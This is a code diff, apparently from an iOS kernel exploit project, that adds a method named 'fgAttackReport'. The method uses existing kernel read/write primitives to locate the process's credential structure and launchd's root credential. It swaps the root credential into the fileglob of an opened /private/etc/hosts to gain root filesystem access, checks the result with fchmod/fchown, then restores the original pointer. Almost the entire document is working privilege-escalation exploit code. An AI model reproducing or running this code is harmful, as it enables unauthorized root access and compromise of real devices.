@@ -2293,6 +2293,78 @@ static NSString *kpFmtSptmFn(uint64_t raw)
 
 #pragma mark - EXP-09: ucred pointer-swap root (heap-only)
 
++ (NSString *)fgAttackReport
+{
+    NSMutableString *r = [NSMutableString string];
+    [r appendString:@"\n=== FGATTACK: f_cred swap (kwrite-only) ===\n"];
+    if (!gPrimitives.kreadbuf || !gPrimitives.kwritebuf) {
+        [r appendString:@"[RESULT] АТАКА: FAIL — KRW не активна, сначала эксплойт.\n"];
+        return r;
+    }
+    uint64_t selfProc = proc_self();
+    if (!kpLooksLikeKernelPointer(selfProc)) selfProc = [self findSelfProcByPidFast:(uint32_t)getpid() log:r];
+    if (!selfProc) selfProc = [self findProcByPid:(uint32_t)getpid() log:r];
+    if (!selfProc) { [r appendString:@"[RESULT] АТАКА: FAIL — свой proc не найден\n"]; return r; }
+    uint64_t procRo = kp_untag_ptr(early_kread64(selfProc + koffsetof(proc, proc_ro)));
+    uint64_t curUcred = kpLooksLikeKernelPointer(procRo) ? kp_untag_ptr(early_kread64(procRo + koffsetof(proc_ro, ucred))) : 0;
+    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] proc=%#llx proc_ro=%#llx ucred=%#llx", (unsigned long long)selfProc, (unsigned long long)procRo, (unsigned long long)curUcred]);
+    if (!kpLooksLikeKernelPointer(curUcred)) { [r appendString:@"[RESULT] АТАКА: FAIL — ucred не найден\n"]; return r; }
+    // --- FGATTACK body (kwrite-only, type-gated) ---
+            {
+                uint64_t ldProc = [self findProcByPid:1 log:nil];
+                uint64_t rootZVA = 0;
+                if (kpLooksLikeKernelPointer(ldProc)) {
+                    uint64_t ldRo = kp_untag_ptr(early_kread64(ldProc + koffsetof(proc, proc_ro)));
+                    uint64_t ldUc = kpLooksLikeKernelPointer(ldRo) ? kp_untag_ptr(early_kread64(ldRo + koffsetof(proc_ro, ucred))) : 0;
+                    uint32_t ldUid = ldUc ? (uint32_t)early_kread64(ldUc + 0x18) : 0xffff;
+                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] launchd ucred=%#llx uid=%u", (unsigned long long)ldUc, ldUid]);
+                    if (ldUid == 0 && kpLooksLikeKernelPointer(ldUc)) rootZVA = ldUc;
+                }
+                int tfd = open("/private/etc/hosts", O_RDONLY);
+                kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] rootZVA=%#llx hosts fd=%d", (unsigned long long)rootZVA, tfd]);
+                uint64_t fpRaw = 0, globRaw = 0, fdOf = 0;
+                if (tfd >= 0 && rootZVA && selfProc) {
+                    kpRead(selfProc + 0xF8, &fdOf, 8, "fd_ofiles", r);
+                    uint64_t ofiles = kp_untag_ptr(fdOf);
+                    if (kpLooksLikeKernelPointer(ofiles))
+                        kpRead(ofiles + (uint64_t)tfd * 8, &fpRaw, 8, "ofiles[fd]", r);
+                    uint64_t fp = kp_untag_ptr(fpRaw);
+                    if (kpLooksLikeKernelPointer(fp))
+                        kpRead(fp + off_fileproc_fp_glob, &globRaw, 8, "fileproc.glob", r);
+                    uint64_t glob = kp_untag_ptr(globRaw);
+                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileproc=%#llx fileglob=%#llx", (unsigned long long)fp, (unsigned long long)glob]);
+                    uint32_t fgOff = 0xFFFFFFFF;
+                    if (kpLooksLikeKernelPointer(glob)) {
+                        for (uint32_t o = 0; o + 8 <= 0x200; o += 8)
+                            if (early_kread64(glob + o) == curUcred) { fgOff = o; break; }
+                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred offset=%@",
+                                  fgOff != 0xFFFFFFFF ? [NSString stringWithFormat:@"+%#x ★", fgOff] : @"not found"]);
+                    }
+                    uint64_t globPA = kpLooksLikeKernelPointer(glob) ? kvtophys(glob & ~0x3fffULL) : 0;
+                    int globT = globPA ? kpFrameTypeOf(globPA) : -1;
+                    kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fileglob pagePA=%#llx type=%d — kwrite %@",
+                              (unsigned long long)globPA, globT,
+                              globT == 0x21 ? @"allowed (0x21)" : @"BLOCKED (not 0x21 - skipped, no panic)"]);
+                    if (fgOff != 0xFFFFFFFF && globT == 0x21) {
+                        uint64_t old = early_kread64(glob + fgOff);
+                        early_kwrite64(glob + fgOff, rootZVA);
+                        uint64_t rb = early_kread64(glob + fgOff);
+                        int ch = fchmod(tfd, 0644);
+                        int ch2 = fchown(tfd, 0, 0);
+                        kpNote(r, [NSString stringWithFormat:@"  [FGATTACK] fg_cred->root: readback=%#llx fchmod=%d fchown=%d errno=%d — %@",
+                                  (unsigned long long)rb, ch, ch2, errno,
+                                  (rb == rootZVA && (ch == 0 || ch2 == 0)) ? @"ROOT-FS WIN" : @"miss"]);
+                        if (ch == 0 || ch2 == 0) {
+                            kpNote(r, @"=== ROOT (filesystem) WIN: f_cred authorization passes as root ===");
+                        }
+                        early_kwrite64(glob + fgOff, old);
+                    }
+                }
+                if (tfd >= 0) close(tfd);
+            }
+    return r;
+}
+
 + (NSString *)ucredHeapSwapReport
 {
     NSMutableString *r = [NSMutableString string];
